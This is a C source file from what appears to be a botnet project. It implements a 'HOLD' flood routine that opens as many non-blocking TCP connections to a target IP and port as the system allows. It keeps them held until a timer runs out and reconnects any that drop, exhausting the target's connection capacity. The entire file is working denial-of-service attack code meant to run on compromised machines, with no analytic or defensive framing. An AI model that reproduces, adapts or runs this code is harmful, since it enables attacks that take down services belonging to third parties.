#include "../../includes/px_botnet.h"

void HOLD(unsigned char *ip, int port, int end_time)
{

	int max = getdtablesize() / 2, i;

	struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(port);
	if (getHost(ip, &dest_addr.sin_addr))
		return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

	struct state_t
	{
		int fd;
		uint8_t state;
	} fds[max];
	memset(fds, 0, max * (sizeof(int) + 1));

	fd_set myset;
	struct timeval tv;
	socklen_t lon;
	int valopt, res;

	unsigned char *watwat = malloc(1024);
	memset(watwat, 0, 1024);

	int end = time(NULL) + end_time;
	while (end > time(NULL))
	{
		for (i = 0; i < max; i++)
		{
			switch (fds[i].state)
			{
			case 0:
			{
				fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
				fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
				if (connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS)
					close(fds[i].fd);
				else
					fds[i].state = 1;
			}
			break;

			case 1:
			{
				FD_ZERO(&myset);
				FD_SET(fds[i].fd, &myset);
				tv.tv_sec = 0;
				tv.tv_usec = 10000;
				res = select(fds[i].fd + 1, NULL, &myset, NULL, &tv);
				if (res == 1)
				{
					lon = sizeof(int);
					getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void *)(&valopt), &lon);
					if (valopt)
					{
						close(fds[i].fd);
						fds[i].state = 0;
					}
					else
					{
						fds[i].state = 2;
					}
				}
				else if (res == -1)
				{
					close(fds[i].fd);
					fds[i].state = 0;
				}
			}
			break;

			case 2:
			{
				FD_ZERO(&myset);
				FD_SET(fds[i].fd, &myset);
				tv.tv_sec = 0;
				tv.tv_usec = 10000;
				res = select(fds[i].fd + 1, NULL, NULL, &myset, &tv);
				if (res != 0)
				{
					close(fds[i].fd);
					fds[i].state = 0;
				}
			}
			break;
			}
		}
	}
}